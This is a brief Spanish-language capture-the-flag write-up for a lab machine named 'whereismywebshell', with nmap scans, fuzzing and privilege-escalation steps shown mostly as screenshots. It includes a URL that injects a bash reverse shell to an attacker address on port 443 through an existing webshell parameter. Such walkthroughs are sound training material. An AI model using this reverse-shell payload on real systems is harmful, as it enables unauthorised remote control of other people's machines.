# Maquina whereismywebshell

### PUERTOS ABIERTOS

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1

![alt text](image.png)

### SERVICIOS Y VERSIONES

sudo nmap -sVC --min-rate 6000 -p80 -vvv -Pn 172.17.0.1

![alt text](image-1.png)

### ENTRANO EN LA WEB

![alt text](image-2.png)

### FUZZING WEB

![alt text](image-3.png)


entramos en warning.html

![alt text](image-4.png)

### IDENTIFICAR EL PARÁMETRO

![alt text](image-5.png)


en la url hacemos:

http://172.17.0.1/shell.php?parameter=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.3/443%200%3E%261%22

previamente en escucha en el puerto 443

### ESCALAR PRIVILEGIOS

![alt text](image-6.png)